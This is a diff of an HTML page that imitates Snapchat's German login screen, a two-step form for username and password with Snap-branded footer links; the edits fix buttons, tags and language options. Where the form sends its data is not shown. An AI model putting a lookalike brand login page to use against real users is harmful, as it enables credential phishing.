@@ -17,7 +17,6 @@
         <label for="username">Nutzername oder E-Mail</label>
         <input type="text" id="username" name="username" required />
         <button type="button" id="step1-button" onclick="goToStep2()" disabled>Weiter</button>
-        <button type="submit" id="step2-button" disabled>Weiter</button>
       </div>
 
       <div class="login-box" id="step2" style="display: none;">
@@ -29,19 +28,19 @@
         </div>
         <label for="password">Passwort</label>
         <input type="password" id="password" name="password" required />
-        <button type="button" id="step1-button" onclick="goToStep2()" disabled>Weiter</button>
+        <button type="submit" id="step2-button" disabled>Weiter</button>
       </div>
 
     </form>
   </div>
 
- <footer>
+  <footer>
     <div class="footer-columns">
       <div>
         <h4>Unternehmen</h4>
         <ul>
           <li><a href="https://www.snap.com/?lang=de-DE" target="_blank">Snap Inc.</a></li>
-          <li><a href="https://careers.snap.com/" target="_blank">Karriere</a></li
+          <li><a href="https://careers.snap.com/" target="_blank">Karriere</a></li>
           <li><a href="https://newsroom.snap.com/" target="_blank">News</a></li>
         </ul>
       </div>
@@ -79,15 +78,14 @@
     <div class="language-selector">
       <label for="language">Sprache</label>
       <select id="language" name="language">
-        <option selected>Deutsch</option>
-        <option>English</option>
-        <option>Français</option>
-        <option>Español</option>
+        <option selected value="de">Deutsch</option>
+        <option value="en">English</option>
+        <option value="fr">Français</option>
+        <option value="es">Español</option>
       </select>
     </div>
   </footer>
 
   <script src="script.js"></script>
-  
-  </body>
-  </html>
+</body>
+</html>
